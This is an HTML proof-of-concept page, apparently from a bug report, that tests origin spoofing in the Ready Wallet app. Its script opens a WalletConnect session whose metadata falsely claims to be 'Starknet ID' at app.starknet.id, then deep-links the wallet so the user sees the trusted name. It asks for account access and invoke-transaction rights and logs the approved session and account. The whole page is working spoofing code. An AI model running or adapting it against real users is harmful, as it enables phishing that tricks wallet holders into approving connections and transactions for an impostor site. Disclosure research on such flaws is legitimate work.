<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Ready Wallet Origin Spoof PoC</title>
</head>
<body>
  <h1>Ready Wallet Origin Spoof PoC</h1>
  <button id="connect">KONTOL connect prompt</button>
  <pre id="log"></pre>

  <script type="module">
    import { UniversalProvider } from 'https://esm.sh/@walletconnect/universal-provider@2.17.0';

    const REAL_ORIGIN = location.origin;
    const CLAIMED_URL = 'https://app.starknet.id';
    const CLAIMED_NAME = 'Starknet ID';

    const log = (msg) => {
      document.getElementById('log').textContent += msg + '\n';
    };

    document.getElementById('connect').onclick = async () => {
      try {
        log('Initializing...');

        const provider = await UniversalProvider.init({
          projectId: '2f05ae7f1116030fde2d36508f472bfb',
          metadata: {
            name: CLAIMED_NAME,
            description: 'Spoofed dApp',
            url: CLAIMED_URL,
            icons: []
          },
          relayUrl: 'wss://relay.walletconnect.com'
        });

        log('Provider ready!');

        const { uri, approval } = await provider.client.connect({
          requiredNamespaces: {
            starknet: {
              chains: ['starknet:SNMAIN'],
              methods: [
                'starknet_account',
                'starknet_requestAddInvokeTransaction'
              ],
              events: ['accountsChanged', 'chainChanged']
            }
          }
        });

        if (uri) {
          log('Real origin  : ' + REAL_ORIGIN);
          log('Claimed URL  : ' + CLAIMED_URL);
          log('URI generated: ' + uri.substring(0, 60) + '...');
          log('');
          log('Trying to open Ready Wallet...');

          // Coba buka Ready dulu
          window.open('ready://', '_blank');

          await new Promise(r => setTimeout(r, 1000));

          // Kirim URI ke Ready
          window.open(`ready://wc?uri=${encodeURIComponent(uri)}`, '_blank');

          log('Waiting for user to approve in Ready Wallet...');
          log('(Check domain shown in Ready Wallet popup!)');

          // Tunggu approval
          try {
            const session = await approval();
            log('');
            log('=== SESSION APPROVED! ===');
            log('Session topic: ' + session.topic);

            const accounts = session?.namespaces?.starknet?.accounts;
            if (accounts?.length > 0) {
              const account = accounts[0].split(':')[2];
              log('Account: ' + account);
            }

            log('');
            log('RESULT: Domain shown in Ready Wallet = ' + CLAIMED_URL);
            log('RESULT: Real domain = ' + REAL_ORIGIN);
            log('If Ready showed app.starknet.id → ORIGIN SPOOF CONFIRMED!');
          } catch(e) {
            log('Approval error/timeout: ' + e.message);
          }
        }
      } catch(e) {
        log('Error: ' + e.message);
      }
    };
  </script>
</body>
</html>
